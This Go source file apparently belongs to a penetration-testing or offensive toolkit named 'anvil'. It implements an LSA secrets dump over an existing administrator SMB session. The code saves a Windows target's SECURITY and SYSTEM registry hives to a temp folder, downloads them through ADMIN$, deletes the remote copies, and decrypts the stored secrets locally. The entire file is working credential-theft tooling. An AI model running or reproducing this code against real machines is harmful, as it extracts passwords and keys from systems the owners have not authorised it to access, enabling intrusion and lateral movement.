package smbclient

import (
	"fmt"
	"os"
	"path/filepath"

	"anvil/internal/lsa"
)

// LsaDump performs the LSA secrets dump on the existing session: the
// SECURITY and SYSTEM hives are saved on the target (winreg), downloaded
// over the existing session (ADMIN$ tree connect), parsed and decrypted
// LOCALLY by internal/lsa, and then the remote hive files and the local
// temp dir are deleted. Same sensitive-material contract as SamDump:
// nothing persists, leftovers are named in warnings. No new connections.
func (s *Session) LsaDump() (result *lsa.Result, warnings []string, err error) {
	tag := randHex(4)
	secName := "anv-sec-" + tag + ".tmp"
	sysName := "anv-sys-" + tag + ".tmp"
	secRemote := `C:\Windows\Temp\` + secName
	sysRemote := `C:\Windows\Temp\` + sysName

	// Switch to execShare (ADMIN$) for download + remote cleanup; restore
	// the caller's share afterwards.
	prevShare := s.Share()
	if prevShare != execShare {
		if err := s.UseShare(execShare); err != nil {
			return nil, nil, fmt.Errorf("cannot access %s for hive download: %v", execShare, err)
		}
		defer func() {
			if prevShare != "" {
				_ = s.UseShare(prevShare)
			}
		}()
	}

	// Local temp dir for the downloaded hives — credential material,
	// removed on every path.
	dir, err := os.MkdirTemp("", "anvil-lsadump-")
	if err != nil {
		return nil, nil, err
	}
	defer os.RemoveAll(dir)

	// Save both hives on the target (admin + backup privilege required).
	secSaved, sysSaved := false, false
	if err := s.RegSave(`HKLM\SECURITY`, secRemote); err != nil {
		return nil, nil, fmt.Errorf("save HKLM\\SECURITY (admin required): %v", err)
	}
	secSaved = true
	if err := s.RegSave(`HKLM\SYSTEM`, sysRemote); err != nil {
		warnings = s.cleanupHives(secSaved, sysSaved, secName, sysName, warnings)
		return nil, warnings, fmt.Errorf("save HKLM\\SYSTEM (admin required): %v", err)
	}
	sysSaved = true

	// Download both hives.
	secLocal := filepath.Join(dir, "security.hive")
	sysLocal := filepath.Join(dir, "system.hive")
	if _, _, err := s.Get("Temp/"+secName, secLocal); err != nil {
		warnings = s.cleanupHives(secSaved, sysSaved, secName, sysName, warnings)
		return nil, warnings, fmt.Errorf("download SECURITY hive: %v", err)
	}
	if _, _, err := s.Get("Temp/"+sysName, sysLocal); err != nil {
		warnings = s.cleanupHives(secSaved, sysSaved, secName, sysName, warnings)
		return nil, warnings, fmt.Errorf("download SYSTEM hive: %v", err)
	}

	// Remote copies no longer needed — delete and report leftovers.
	warnings = s.cleanupHives(secSaved, sysSaved, secName, sysName, warnings)

	// Parse + decrypt locally; the hives never leave this host.
	secData, err := os.ReadFile(secLocal)
	if err != nil {
		return nil, warnings, fmt.Errorf("read local SECURITY hive: %v", err)
	}
	sysData, err := os.ReadFile(sysLocal)
	if err != nil {
		return nil, warnings, fmt.Errorf("read local SYSTEM hive: %v", err)
	}

	result, err = lsa.Dump(sysData, secData)
	if err != nil {
		return nil, warnings, fmt.Errorf("lsa dump: %v", err)
	}
	return result, warnings, nil
}
